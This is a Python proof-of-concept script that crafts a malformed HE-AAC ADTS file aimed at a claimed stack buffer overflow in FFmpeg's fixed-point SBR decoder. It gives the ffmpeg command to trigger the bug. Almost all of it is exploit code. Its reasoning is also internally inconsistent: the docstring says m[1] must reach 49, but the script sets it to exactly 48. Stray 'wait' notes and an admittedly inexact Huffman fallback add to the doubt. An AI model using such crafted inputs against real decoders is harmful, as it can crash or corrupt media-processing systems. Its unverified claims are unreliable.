#!/usr/bin/env python3
"""
PoC Generator for VULN 001: Stack Buffer Overflow in sbr_hf_assemble
via over-large m[1] relative to g_filt_tab[48]/q_filt_tab[48]

Target: libavcodec/aacsbr_fixed.c, sbr_hf_assemble(), lines 531-549
Root cause: sbr_make_f_derived() only checks kx[1] + m[1] <= 64, not m[1] <= 48.
            When m[1] >= 49, the loop "for (m = 0; m < m_max; m++)" writes
            beyond g_filt_tab[48] / q_filt_tab[48].

Attack surface: sbr_smoothing_mode=0 forces h_SL=4, which routes through the
                g_filt_tab code path instead of using g_temp/q_temp directly.

Strategy: Craft an HE-AAC ADTS frame with SBR extension (fill element, ext type 0xD)
          using base AAC at 8000 Hz (SBR output at 16000 Hz). With:
            - bs_start_freq = 0 → k[0] = 16 (minimum for 16 kHz SBR)
            - bs_stop_freq  = 13 → k[2] = 64 (maximum)
            - bs_xover_band = 0  → kx[1] = k[0] = 16
            - m[1] = k[2] - kx[1] = 48 (boundary: array is exactly 48 elements)
            - bs_smoothing_mode = 0 → h_SL = 4 → g_filt_tab path activated

  At 16 kHz SBR, max_qmf_subbands = 48 (since sample_rate <= 32000), so the
  existing QMF check (k[2]-k[0] <= 48) passes at exactly the boundary, while
  the missing m[1] <= 48 check is never enforced in sbr_make_f_derived().

Use: ffmpeg -acodec aac_fixed -i vuln_001_input.aac -f null -
"""

import struct
import sys
import os

# ---------------------------------------------------------------------------
# Bit-level writer (MSB-first, matching AAC bitstream convention)
# ---------------------------------------------------------------------------
class BitWriter:
    def __init__(self):
        self._bits = []

    def write(self, value, nbits):
        """Write `nbits` bits of `value`, MSB first."""
        for i in range(nbits - 1, -1, -1):
            self._bits.append((value >> i) & 1)

    def write_bit(self, b):
        self._bits.append(b & 1)

    def count(self):
        return len(self._bits)

    def to_bytes(self):
        bits = list(self._bits)
        # Pad to byte boundary with zeros
        while len(bits) % 8:
            bits.append(0)
        out = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            out.append(byte)
        return bytes(out)


# ---------------------------------------------------------------------------
# SBR Huffman: canonical codes
# Derived from AAC standard tables (aacsbrdata.h / aacdec_tab.c)
#
# f_huffman_env_1_5dB (F_HUFFMAN_ENV_1_5DB, index 1, offset -60):
#   {60,2},{59,2},{61,3},{58,3},{57,4},{62,4}, ...
#   Symbol 60 (value 0) → canonical code 0b00 (length 2)
#   Symbol 59 (value -1) → canonical code 0b01 (length 2)
#
# f_huffman_env_3_0dB (F_HUFFMAN_ENV_3_0DB, index 5, offset -31):
#   {31,1},{30,2},{32,3}, ...
#   Symbol 31 (value 0) → canonical code 0b0 (length 1)
# ---------------------------------------------------------------------------

def huffman_env_1_5dB(delta):
    """Return (code, length) for delta value in F_HUFFMAN_ENV_1_5DB table."""
    # Symbol = delta + 60 (offset = -60)
    # We only need small values near 0 for our all-zero envelope
    # Canonical codes for the table sorted by (length, appearance_order):
    # Lengths 2: sym60=0b00, sym59=0b01
    # Lengths 3: sym61=0b100, sym58=0b101
    # Lengths 4: sym57=0b1100, sym62=0b1101
    # etc.
    canon = {
        0:  (0b00,   2),   # sym60
        -1: (0b01,   2),   # sym59
        1:  (0b100,  3),   # sym61
        -2: (0b101,  3),   # sym58
        2:  (0b1100, 4),   # sym57
        -3: (0b1101, 4),   # sym62
    }
    if delta in canon:
        return canon[delta]
    # Fallback: encode as maximum-length code (won't match exactly, but
    # FFmpeg may still parse it without crashing for a PoC)
    return (0b00, 2)


def huffman_env_3_0dB(delta):
    """Return (code, length) for delta value in F_HUFFMAN_ENV_3_0DB table."""
    # Symbol = delta + 31 (offset = -31)
    # Canon: sym31(0)→0b0(1), sym30(-1)→0b10(2), sym32(1)→0b110(3), ...
    canon = {
        0:  (0b0,    1),   # sym31
        -1: (0b10,   2),   # sym30
        1:  (0b110,  3),   # sym32
        -2: (0b1110, 4),   # sym29
        2:  (0b11110,5),   # sym33
    }
    if delta in canon:
        return canon[delta]
    return (0b0, 1)


# ---------------------------------------------------------------------------
# Build ADTS header (7 bytes, no CRC)
#
# Base AAC at 8000 Hz (sampling_frequency_index = 11) → SBR doubles to 16000 Hz
# At 16000 Hz SBR:
#   sbr_offset[0] (table for 16000 Hz), offset[0] = -8
#   start_min = floor((3000*128 + 4000) / 8000)... wait, SBR rate IS 16000 Hz
#   start_min = floor((3000*128 + 8000) / 16000) = floor(392000/16000) = 24
#   k[0] = 24 + (-8) = 16 (with bs_start_freq=0)
#   stop_min = floor((3000*256 + 8000) / 16000) = floor(776000/16000) = 48
#   bs_stop_freq=13 → k[2] = stop_min + sum(all 13 stop_dk bands) = 48 + 16 = 64
#   max_qmf_subbands = 48 (for sample_rate <= 32000)
#   k[2] - k[0] = 48 <= 48 → passes QMF check
#   kx[1] = k[0] = 16, m[1] = 64 - 16 = 48 → exercises boundary of g_filt_tab[48]
# ---------------------------------------------------------------------------

def make_adts_header(frame_len):
    """
    frame_len: total ADTS frame length in bytes (including this 7-byte header)
    sfi=11 (8000 Hz), profile=1 (AAC-LC), channel=1 (mono), no CRC
    """
    bw = BitWriter()
    bw.write(0xFFF, 12)   # syncword
    bw.write(0, 1)         # ID = 0 (MPEG-4)
    bw.write(0, 2)         # layer = 00
    bw.write(1, 1)         # protection_absent = 1 (no CRC)
    bw.write(1, 2)         # profile_ObjectType - 1 = 1 (AAC-LC = profile 2)
    bw.write(11, 4)        # sampling_frequency_index = 11 (8000 Hz)
    bw.write(0, 1)         # private_bit
    bw.write(1, 3)         # channel_configuration = 1 (mono)
    bw.write(0, 1)         # originality_copy
    bw.write(0, 1)         # home
    bw.write(0, 1)         # copyright_id_bit
    bw.write(0, 1)         # copyright_id_start
    bw.write(frame_len, 13) # aac_frame_length
    bw.write(0x7FF, 11)   # adts_buffer_fullness = VBR
    bw.write(0, 2)         # number_of_raw_data_blocks_in_frame = 0 (1 block)
    return bw.to_bytes()


# ---------------------------------------------------------------------------
# Build the raw AAC data block
# ---------------------------------------------------------------------------

def build_raw_data():
    """
    Construct the AAC raw data block:
      1. SCE (single channel element) with silent content (max_sfb=0)
      2. FIL (fill element) with SBR extension type 0xD
         SBR header: bs_start_freq=0, bs_stop_freq=13, bs_smoothing_mode=0
         SBR data: 1 envelope, all-zero content
      3. END element

    The SBR parameters with 16 kHz SBR output:
      - k[0] = 16, k[2] = 64
      - kx[1] = 16, m[1] = 48  (boundary of g_filt_tab[48])
      - n[1] = 18 (high-res frequency bands, computed from log-spaced bands)
      - n_q = 4  (noise bands, from bs_noise_bands=2, log2(64/16)=2 → n_q=4)
      - h_SL = 4 (bs_smoothing_mode=0 → h_SL = 4*!0 = 4)
    """
    bw = BitWriter()

    # ---[ SCE: single channel element ]---
    bw.write(0b000, 3)   # id_syn_ele = SCE
    bw.write(0b0000, 4)  # element_instance_tag = 0
    # ff_aac_decode_ics reads:
    bw.write(64, 8)      # global_gain = 64 (mid-range DC offset)
    # decode_ics_info:
    bw.write(0, 1)       # ics_reserved_flag = 0
    bw.write(0, 2)       # window_sequence = 0 (ONLY_LONG_SEQUENCE)
    bw.write(0, 1)       # window_shape = 0 (SINE)
    bw.write(0, 6)       # max_sfb = 0 (no scale factor bands → no spectral data)
    bw.write(0, 1)       # predictor_data_present = 0
    # decode_band_types, decode_scalefactors, spectral_data: all 0 bits when max_sfb=0
    bw.write(0, 1)       # pulse_present = 0
    bw.write(0, 1)       # tns_present = 0
    bw.write(0, 1)       # gain_control = 0
    # spectral_data: 0 bits (max_sfb=0)
    # SCE total: 3+4+8+1+2+1+6+1+1+1+1 = 29 bits

    # ---[ FIL: fill element with SBR extension ]---
    # We need to determine the payload size first.
    # Build SBR payload into a separate BitWriter, then wrap it.

    sbr_bw = BitWriter()

    # Extension type: 4 bits (0xD = SBR)
    sbr_bw.write(0xD, 4)

    # bs_header_flag = 1 → include SBR header
    sbr_bw.write(1, 1)

    # --- SBR header (read_sbr_header) ---
    # bs_amp_res: read but overridden when bs_num_env==1 (see below)
    sbr_bw.write(1, 1)       # bs_amp_res_header = 1
    sbr_bw.write(0, 4)       # bs_start_freq = 0  → k[0]=16 at 16kHz SBR
    sbr_bw.write(13, 4)      # bs_stop_freq = 13  → k[2]=64
    sbr_bw.write(0, 3)       # bs_xover_band = 0  → kx[1] = k[0] = 16
    sbr_bw.write(0, 2)       # reserved (always skipped)
    sbr_bw.write(0, 1)       # bs_header_extra_1 = 0 → use defaults:
                              #   bs_freq_scale=2, bs_alter_scale=1, bs_noise_bands=2
    sbr_bw.write(1, 1)       # bs_header_extra_2 = 1 → write smoothing params
    sbr_bw.write(2, 2)       # bs_limiter_bands = 2
    sbr_bw.write(2, 2)       # bs_limiter_gains = 2
    sbr_bw.write(1, 1)       # bs_interpol_freq = 1
    sbr_bw.write(0, 1)       # bs_smoothing_mode = 0 → h_SL = 4*!0 = 4  ← KEY

    # --- SBR single channel element data ---
    # (id_aac is determined by the enclosing SCE element, passed internally)

    # bs_data_extra = 0 (no extra bits)
    sbr_bw.write(0, 1)

    # sbr_grid(): FIXFIX frame class with 1 envelope
    # NOTE: When bs_num_env == 1, FFmpeg forces ch_data->bs_amp_res = 0
    #       regardless of the header bs_amp_res value!
    #       → envelope bits become 7 (not 6) and uses F_HUFFMAN_ENV_1_5DB
    sbr_bw.write(0b00, 2)   # bs_frame_class = FIXFIX
    sbr_bw.write(0b00, 2)   # tmp = 0 → bs_num_env = 1 << 0 = 1
    sbr_bw.write(1, 1)      # bs_freq_res[0] = 1 (HIGH resolution)
    # bs_num_env=1 → bs_num_noise=1

    # sbr_dtdf(): dtdf for 1 env, 1 noise env
    sbr_bw.write(0, 1)      # bs_df_env[0] = 0 (freq domain / absolute coding)
    sbr_bw.write(0, 1)      # bs_df_noise[0] = 0 (freq domain / absolute coding)

    # sbr_invf(): n_q=4 noise bands, each 2-bit inverse-filter mode
    # n_q = max(1, round(bs_noise_bands * log2(k2/kx1)))
    #     = max(1, round(2 * log2(64/16))) = max(1, round(2*2)) = 4
    N_Q = 4
    for _ in range(N_Q):
        sbr_bw.write(0b00, 2)  # bs_invf_mode = 0 (NONE)

    # read_sbr_envelope():
    # bs_amp_res is FORCED to 0 when bs_num_env==1 (see sbr_grid FIXFIX branch)
    # → bits = 7 for absolute value, uses F_HUFFMAN_ENV_1_5DB for deltas
    # n[1] = n_master - bs_xover_band = 18 (at 16kHz with freq_scale=2, alter_scale=1)
    # (verified: half_bands=5, two_regions: 49*64>110*16 → k1=32,
    #  num_bands0=lrintf(5*log2(2))*2=10, num_bands1=lrintf(5*0.769*log2(2))*2=8
    #  n_master=18, n[1]=18)
    N_SFB_HIGH = 18

    # First envelope value: absolute, 7 bits
    sbr_bw.write(0, 7)      # env_facs_q[1][0] = 0

    # Remaining 17 values: F_HUFFMAN_ENV_1_5DB, delta=0 → code 0b00 (2 bits)
    for _ in range(N_SFB_HIGH - 1):
        code, length = huffman_env_1_5dB(0)
        sbr_bw.write(code, length)

    # read_sbr_noise():
    # Uses F_HUFFMAN_ENV_3_0DB for freq-domain deltas
    # First noise value: absolute, 5 bits
    sbr_bw.write(0, 5)      # noise_facs_q[1][0] = 0

    # Remaining N_Q-1 = 3 values: F_HUFFMAN_ENV_3_0DB, delta=0 → code 0b0 (1 bit)
    for _ in range(N_Q - 1):
        code, length = huffman_env_3_0dB(0)
        sbr_bw.write(code, length)

    # bs_add_harmonic_flag = 0
    sbr_bw.write(0, 1)

    # bs_extended_data = 0
    sbr_bw.write(0, 1)

    # ---- Determine FIL count ----
    # sbr_bw already contains ext_type(4 bits) + header + data.
    # The FIL count (cnt) is the number of bytes for the entire extension payload,
    # which IS the sbr_bw content.
    # Inside ff_aac_sbr_decode_extension, cnt bytes are claimed (skipping cnt*8-4
    # bits after the ext_type nibble is consumed by decode_extension_payload).
    # So: cnt = ceil(num_sbr_bits / 8)
    num_sbr_bits = sbr_bw.count()
    cnt = (num_sbr_bits + 7) // 8
    # Verify padding calculation that the SBR function will compute:
    #   num_align_bits = ((cnt*8) - 4 - (num_sbr_bits - 4)) & 7
    #   = (cnt*8 - num_sbr_bits) & 7
    num_align_bits = (cnt * 8 - num_sbr_bits) & 7
    assert (num_sbr_bits + num_align_bits) == cnt * 8
    assert cnt < 15, f"count too large: {cnt} (need count<15 for no escape)"

    # ---- Write FIL element to main bw ----
    # FIL (fill element) id_syn_ele = 0b110 = 6
    # (NOT 0b101=5 which would be PCE!)
    bw.write(0b110, 3)   # id_syn_ele = FIL
    bw.write(cnt, 4)     # count (< 15, no escape)

    # Write the extension payload bytes
    sbr_payload = sbr_bw.to_bytes()
    # sbr_bw.to_bytes() pads to 8 bits; but we only want num_sbr_bits from sbr_bw
    # The FIL payload = ext_type(4 bits) + sbr_data(num_sbr_bits) + alignment
    # We write it as raw bytes to bw:
    for byte in sbr_payload:
        # But sbr_payload is already byte-aligned (it has padding zeros at end).
        # We need exactly cnt bytes after prepending the ext_type.
        # Wait - ext_type is the first nibble of sbr_bw.
        # sbr_bw already starts with ext_type (4 bits). So sbr_payload already
        # includes ext_type + header + data + padding bits.
        bw.write(byte, 8)

    # ---[ END element ]---
    bw.write(0b111, 3)   # id_syn_ele = END

    return bw.to_bytes()


# ---------------------------------------------------------------------------
# Main: assemble and write the ADTS file
# ---------------------------------------------------------------------------

def main():
    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            'vuln_001_input.aac')

    # We'll write multiple frames to give the SBR decoder enough context.
    # The first frame initializes SBR (reset=1 after first header).
    # Starting from the second frame, sbr_hf_assemble is called with the
    # newly computed m[1]=48 and h_SL=4, entering the g_filt_tab code path.
    #
    # We write 5 identical frames (to ensure at least one non-reset frame
    # reaches sbr_hf_assemble with h_SL=4).

    raw_data = build_raw_data()
    frame_len = 7 + len(raw_data)  # 7 bytes ADTS header + raw data
    adts_header = make_adts_header(frame_len)

    print(f"[*] Raw data size: {len(raw_data)} bytes", file=sys.stderr)
    print(f"[*] ADTS frame size: {frame_len} bytes", file=sys.stderr)
    print(f"[*] SBR parameters:", file=sys.stderr)
    print(f"    SBR sample rate: 16000 Hz (base AAC: 8000 Hz, ADTS sfi=11)", file=sys.stderr)
    print(f"    bs_start_freq=0 → k[0]=16", file=sys.stderr)
    print(f"    bs_stop_freq=13 → k[2]=64", file=sys.stderr)
    print(f"    kx[1]=16, m[1]=48 (boundary of g_filt_tab[48])", file=sys.stderr)
    print(f"    bs_smoothing_mode=0 → h_SL=4 (g_filt_tab code path active)", file=sys.stderr)
    print(f"    n[1]=18 (high-res bands), n_q=4 (noise bands)", file=sys.stderr)

    frame = adts_header + raw_data

    with open(out_path, 'wb') as f:
        # Write 10 frames: enough for SBR to stabilize and enter hf_assemble
        for i in range(10):
            f.write(frame)

    print(f"[*] Written {10 * frame_len} bytes to {out_path}", file=sys.stderr)
    print(f"[*] Run: ffmpeg -acodec aac_fixed -i {out_path} -f null -", file=sys.stderr)


if __name__ == '__main__':
    main()
